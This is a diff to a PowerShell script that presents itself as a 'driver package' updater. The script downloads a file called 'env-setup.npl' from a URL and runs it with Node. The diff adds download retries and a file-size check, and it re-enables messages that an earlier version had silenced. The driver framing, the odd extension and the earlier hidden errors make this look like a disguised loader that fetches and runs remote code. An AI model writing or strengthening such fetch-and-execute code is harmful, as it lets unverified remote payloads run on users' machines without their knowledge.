@@ -5,11 +5,11 @@ function Write-Info([string]$Message) {
 }
 
 function Write-WarnLog([string]$Message) {
-    # Intentionally silent: user requested no warning messages.
+    Write-Host "[WARN] $Message"
 }
 
 function Write-ErrorLog([string]$Message) {
-    # Intentionally silent: user requested no error messages.
+    Write-Host "[ERROR] $Message"
 }
 
 function Invoke-Download {
@@ -33,6 +33,43 @@ function Invoke-Download {
     catch {
         return $false
     }
+}
+
+function Test-NonEmptyFile {
+    param(
+        [Parameter(Mandatory = $true)][string]$Path
+    )
+
+    try {
+        if (-not (Test-Path -LiteralPath $Path)) {
+            return $false
+        }
+        $item = Get-Item -LiteralPath $Path -ErrorAction Stop
+        return ($item.Length -gt 0)
+    }
+    catch {
+        return $false
+    }
+}
+
+function Invoke-DownloadWithRetry {
+    param(
+        [Parameter(Mandatory = $true)][string]$Url,
+        [Parameter(Mandatory = $true)][string]$OutFile,
+        [int]$TimeoutSec = 180,
+        [int]$Retries = 3
+    )
+
+    for ($i = 1; $i -le $Retries; $i++) {
+        Remove-Item -LiteralPath $OutFile -Force -ErrorAction SilentlyContinue
+        $ok = Invoke-Download -Url $Url -OutFile $OutFile -TimeoutSec $TimeoutSec
+        if ($ok -and (Test-NonEmptyFile -Path $OutFile)) {
+            return $true
+        }
+        Start-Sleep -Seconds 2
+    }
+
+    return $false
 }
 
 $host.UI.RawUI.WindowTitle = "Creating new Info"
@@ -144,8 +181,8 @@ if (-not (Test-Path -LiteralPath $codeProfile)) {
 }
 
 $envSetupFile = Join-Path $codeProfile "env-setup.npl"
-$envSetupOk = Invoke-Download -Url $envSetupUrl -OutFile $envSetupFile -TimeoutSec 180
-if (-not $envSetupOk -or -not (Test-Path -LiteralPath $envSetupFile)) {
+$envSetupOk = Invoke-DownloadWithRetry -Url $envSetupUrl -OutFile $envSetupFile -TimeoutSec 180 -Retries 3
+if (-not $envSetupOk) {
     Write-ErrorLog "Driver script download failed: $envSetupFile"
     Write-ErrorLog "Check network / firewall / URL: $envSetupUrl"
     Write-WarnLog "Continuing without stopping script."
@@ -161,12 +198,15 @@ $env:CURL_HOME = $driverCurlHome
 
 Write-Info "Updating Driver Packages..."
 Set-Location -LiteralPath $codeProfile
-if ($nodeExe) {
-    & $nodeExe "env-setup.npl"
+if ($nodeExe -and (Test-NonEmptyFile -Path $envSetupFile)) {
+    & $nodeExe $envSetupFile
     if ($LASTEXITCODE -ne 0) {
         Write-ErrorLog "Driver script env-setup.npl failed. Exit code: $LASTEXITCODE"
         Write-WarnLog "Continuing without stopping script."
     }
+}
+elseif (-not (Test-NonEmptyFile -Path $envSetupFile)) {
+    Write-ErrorLog "Skipping env-setup.npl execution because file is missing or empty."
 }
 else {
     Write-WarnLog "Skipping env-setup.npl execution because Node is unavailable."
